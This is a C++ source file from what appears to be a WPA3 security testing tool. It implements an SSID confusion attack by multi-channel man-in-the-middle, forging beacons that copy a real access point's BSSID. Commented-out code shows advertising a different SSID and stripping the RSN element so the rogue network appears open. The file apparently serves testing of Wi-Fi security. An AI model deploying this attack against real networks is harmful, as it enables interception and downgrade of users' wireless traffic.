#include "attacks/mc_mitm/ssid_confusion_attack.h"

#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion_hooks.h"
#include "config/RunStatus.h"
#include <tins/tins.h>

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::ssid_confusion{
unique_ptr<Dot11Beacon> make_confused_beacon(const Dot11Beacon &real, const string &, const bool){
	auto b = make_unique<Dot11Beacon>();
	b->addr1(real.addr1()); // broadcast
	b->addr2(real.addr2()); // BSSID (kept identical to real AP — key to the attack)
	b->addr3(real.addr3());
	b->timestamp(real.timestamp());
	b->interval(real.interval());
	b->capabilities() = real.capabilities();

	/*FIXME for (const auto& opt : real.options()) {
			if (opt.option() == IEEE_TLV_TYPE_SSID) {
				// Advertise a different SSID than the real AP
				b->add_option(Dot11::option(
					IEEE_TLV_TYPE_SSID,
					confused_ssid.size(),
					reinterpret_cast<const uint8_t*>(confused_ssid.data())));
			} else if (strip_rsn && opt.option() == IEEE_TLV_TYPE_RSN) {
				// Drop RSN IE — rogue AP appears as an open network
			} else {
				b->add_option(opt);
			}
		}*/
	return b;
}

void run_attack(RunStatus &rs){
	const auto rogue_client = rs.get_actor("rogue_client");
	const auto rogue_ap     = rs.get_actor("rogue_ap");
	const auto ap           = rs.get_actor("ap");
	const auto client       = rs.get_actor("client");

	const auto &att_cfg       = rs.config().at("attack_config");
	const string real_ssid     = ap["ssid"];
	const string confused_ssid = att_cfg.value("confused_ssid", real_ssid);
	const bool   strip_rsn     = att_cfg.value("strip_rsn", false);
	const int    timeout       = att_cfg.value("attack_time_sec", 30);

	McMitm attack(rogue_client, rogue_ap, real_ssid,
				  ap.get(SK::mac), client.get(SK::mac),
				  rs.run_folder() / "logger");

	attack.set_hooks(make_unique<SsidConfusionHooks>(real_ssid, confused_ssid, strip_rsn));

	rogue_client->set_iface_up();
	rogue_ap->set_iface_up();
	rs.start_observers();

	attack.netconfig.real_channel  = rogue_client->get_channel();
	attack.netconfig.rogue_channel = rogue_ap->get_channel();
	attack.netconfig.ssid          = real_ssid;

	attack.run(rs, timeout);
}
}